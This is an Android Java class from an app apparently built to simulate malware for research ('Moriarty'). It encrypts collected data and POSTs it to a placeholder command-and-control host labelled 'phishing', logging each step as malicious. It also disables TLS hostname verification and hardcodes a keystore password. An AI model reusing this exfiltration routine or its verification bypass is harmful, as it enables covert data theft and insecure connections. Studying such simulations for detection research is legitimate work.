package com.bgu.sherlock.Moriarty;

import android.content.Context;
import android.os.Environment;
import android.util.Base64;
import android.util.Log;

import org.apache.commons.io.FileUtils;
import org.json.JSONException;
import org.json.JSONObject;

import javax.crypto.*;
import javax.crypto.spec.DESKeySpec;
import javax.net.ssl.*;
import java.io.*;
import java.net.MalformedURLException;
import java.net.URL;
import java.security.*;
import java.security.cert.CertificateException;
import java.security.spec.InvalidKeySpecException;
import java.util.Random;

/**
 * Created by simondzn on 07/03/2016.
 */
public class SendToServer {
    static Random rand = new Random();
   static String cryptoPass = String.valueOf(rand.nextInt());
    Clues clue = new Clues();


    public static void send(final String data, final String behavior){
        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
Log.e(SendToServer.class.toString(), "in send to server");
        Long startTime = System.currentTimeMillis();
        Clues clue = new Clues();
//        clue.SendMal("Sending Data", "Establishing link with C&C Server", behavior);
        String encrypted = encryptIt(data);
        Context appContext = MyApp.getContext();
        HostnameVerifier hostnameVerifier = new HostnameVerifier() {
            @Override
            public boolean verify(String hostname, SSLSession session) {
                return true;
            }
        };

        URL url = null;
        try {
            File userHash = new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/Sherlock/userMailHashed.json");
            String userMail = FileUtils.readFileToString(userHash);
            JSONObject obj = new JSONObject(userMail);
            Log.e("tag tag", obj.getString("mail_hashed"));
            url = new URL("https://ServerURL:80/archiveArtifact/rest/phishing");
            HttpsURLConnection urlConnection = (HttpsURLConnection) url.openConnection();
            urlConnection.setHostnameVerifier(hostnameVerifier);
            urlConnection.setDoOutput(true);
            urlConnection.setRequestMethod("POST");
            urlConnection.setRequestProperty("Content-Type", "application/txt");
            KeyStore trusted = KeyStore.getInstance("BKS");
            InputStream in = appContext.getResources().openRawResource(R.raw.keyme);
            try {
                // Initialize the keystore with the provided trusted certificates
                // Provide the password of the keystore
                trusted.load(in, "wonG5858".toCharArray());
            } finally {
                in.close();
            }

            //Initialise a TrustManagerFactory with the CA keyStore
            TrustManagerFactory tmf = TrustManagerFactory.getInstance("X509");
            tmf.init(trusted);
            //Create new SSLContext using our new TrustManagerFactory
            SSLContext context = SSLContext.getInstance("TLS");
            context.init(null, tmf.getTrustManagers(), null);
            //Get a SSLSocketFactory from our SSLContext
            SSLSocketFactory sslSocketFactory = context.getSocketFactory();
            //Set our custom SSLSocketFactory to be used by our HttpsURLConnection instance
            urlConnection.setSSLSocketFactory(sslSocketFactory);

            DataOutputStream request = new DataOutputStream(
                    urlConnection.getOutputStream());
            String sendString = obj.getString("mail_hashed").substring(0,10) + ": " + encrypted;
            request.writeBytes(sendString);
            request.flush();
            request.close();

            InputStream responseStream = new
                    BufferedInputStream(urlConnection.getInputStream());

            BufferedReader responseStreamReader =
                    new BufferedReader(new InputStreamReader(responseStream));

            String line = "";
            StringBuilder stringBuilder = new StringBuilder();

            while ((line = responseStreamReader.readLine()) != null) {
                stringBuilder.append(line).append("\n");
            }
            responseStreamReader.close();

            String response = stringBuilder.toString();
            responseStream.close();
            urlConnection.disconnect();
            Log.e(SendToServer.class.toString(), " code: " + urlConnection.getResponseCode());
            if (urlConnection.getResponseCode() == 200 || urlConnection.getResponseCode() == 204) {
                clue.SendMal("Sending Data", "Successful send to server(duration [msec],size [bytes]);" + (System.currentTimeMillis() - startTime) + ";" + sendString.length(),behavior,behavior);
//                imgFile.delete();
//                clue.SendLog("Delete File", "Deleting the temporary photo","malicious");
//                return true;
            } else {
                clue.SendMal("Sending Data", "Error: " + response, behavior, behavior);
//                return false;
            }
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (CertificateException e) {
            e.printStackTrace();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (KeyStoreException e) {
            e.printStackTrace();
        } catch (KeyManagementException e) {
            e.printStackTrace();
        }  catch (JSONException e) {
            e.printStackTrace();
        }

            }
        });
        thread.start();
//        return true;
    }
    public static String encryptIt(String value) {
        try {
            DESKeySpec keySpec = new DESKeySpec(cryptoPass.getBytes("UTF8"));
            SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("DES");
            SecretKey key = keyFactory.generateSecret(keySpec);

            byte[] clearText = value.getBytes("UTF8");
            // Cipher is not thread safe
            Cipher cipher = Cipher.getInstance("DES");
            cipher.init(Cipher.ENCRYPT_MODE, key);

            String encrypedValue = Base64.encodeToString(cipher.doFinal(clearText), Base64.DEFAULT);
            Log.i(SendToServer.class.toString(), "Encrypted: " + value + " -> " + encrypedValue);
            return encrypedValue;

        } catch (InvalidKeyException e) {
            e.printStackTrace();
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        } catch (InvalidKeySpecException e) {
            e.printStackTrace();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (BadPaddingException e) {
            e.printStackTrace();
        } catch (NoSuchPaddingException e) {
            e.printStackTrace();
        } catch (IllegalBlockSizeException e) {
            e.printStackTrace();
        }
        return value;
    }

}


